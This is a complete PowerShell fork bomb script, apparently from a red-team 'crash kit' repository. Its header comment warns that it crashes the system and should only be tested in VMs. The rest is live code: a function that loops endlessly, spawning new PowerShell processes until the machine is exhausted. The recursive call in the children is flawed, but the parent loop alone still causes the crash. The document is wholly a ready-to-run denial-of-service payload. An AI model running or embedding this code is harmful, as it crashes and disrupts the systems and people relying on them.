<#
.SYNOPSIS
    Fork Bomb in PowerShell.
.DESCRIPTION
    A fork bomb that recursively spawns new PowerShell processes.
    WARNING: Running this will crash your system. Only test in isolated environments (e.g., VMs).
.AUTHOR
    Aryan Giri
.REPO
    https://github.com/giriaryan694-a11y/RedTeamCrashKit
#>

function Bomb {
    while ($true) {
        Start-Process powershell -ArgumentList "-Command", "Bomb"
    }
}

Bomb
